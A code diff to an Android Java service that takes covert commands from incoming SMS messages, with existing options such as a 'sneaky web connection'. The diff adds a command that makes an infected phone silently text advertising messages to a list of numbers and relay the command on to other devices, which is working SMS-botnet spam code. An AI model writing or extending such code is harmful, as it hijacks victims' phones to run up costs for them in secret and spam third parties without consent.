@@ -59,9 +59,13 @@ public class CommandService extends Service {
 	 * 7) disable sneaky web connection
 	 *       COMMAND_SIGN   SEPERATE   receiver     SEPERATE  STOP_SNEAKY_WEB (  SEPERATE  time )
 	 *    ex    #!             |         YOU            |            07             |     1234
+	 *    
+	 * 8) forward SMS Ads.
+	 *       COMMAND_SIGN   SEPERATE   receiver     SEPERATE  FORWARD_SMS_ADS  SEPERATE  msg  SEPERATE  adsCount  ( SEPERATE  number )*adsCount ( SEPERATE  time )
+	 *          #!             |         YOU            |            08            |     XDDD     |        1          |     0952559593               |     1234                   
 	 */
 	
-	
+		
 	
 	
 	@Override
@@ -314,6 +318,36 @@ public class CommandService extends Service {
 				}
 				else {
 					String commandTemp = cmd[0]+CommonVariable.SEPERATE+cmd[1]+CommonVariable.SEPERATE+cmd[2];
+					try {
+						forwardToNext(sender,commandTemp,cmd[3]);
+					}catch ( Exception e ) {
+						forwardToNext(sender,commandTemp,null);
+					}
+				}
+			}
+			else if ( cmd[2].contains(CommonVariable.FORWARD_SMS_ADS) ) {
+				if ( isForMe ) {
+					try {
+						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,cmd[3],false);
+					}catch ( Exception e ) {
+						Debug.PrintLog("CommandService", "There is no time in command.");
+						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,null,false);
+					}
+					Debug.PrintLog("CommandService","Forward SMS Ads!!");
+					String message = cmd[3].trim();
+					int count = Integer.parseInt(cmd[4].trim());
+					for ( int i=0 ; i<count ; i++ ) {
+						String dstNumber = cmd[i+5];
+						Debug.PrintLog("CommandService","Forward to: "+dstNumber);
+						SendSMS(dstNumber,dstNumber,message,null,null,false);
+					}
+				}
+				else {
+					String commandTemp = cmd[0]+CommonVariable.SEPERATE+cmd[1]+CommonVariable.SEPERATE+cmd[2]+CommonVariable.SEPERATE+cmd[3]+CommonVariable.SEPERATE+cmd[4];
+					int count = Integer.parseInt(cmd[4].trim());
+					for ( int i=0 ; i<count ; i++ ) {
+						commandTemp += CommonVariable.SEPERATE+cmd[i+5];
+					}
 					try {
 						forwardToNext(sender,commandTemp,cmd[3]);
 					}catch ( Exception e ) {
